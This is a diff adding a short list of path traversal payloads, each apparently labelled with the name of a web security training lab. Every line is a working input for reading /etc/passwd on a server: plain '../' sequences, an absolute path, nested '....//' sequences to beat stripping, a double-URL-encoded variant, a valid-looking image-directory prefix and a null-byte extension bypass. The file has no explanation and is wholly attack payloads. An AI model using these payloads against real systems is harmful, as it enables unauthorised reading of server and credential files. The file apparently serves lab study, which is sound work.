@@ -1,0 +1,6 @@
+1. /../../../etc/passwd (File path traversal, simple case)
+/etc/passwd (File path traversal, traversal sequences blocked)
+//....//....//....//etc/passwd (File path traversal, traversal sequences stripped)
+%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%36%35%25%37%34%25%36%33%25%32%66%25%37%30%25%36%31%25%37%33%25%37%33%25%37%37%25%36%34 ( Path traversal sequences stripped w/ URL-decode )
+/var/www/images/../../../etc/passwd (File path traversal, validation of start of path)
+../../../etc/passwd%0048.jpg
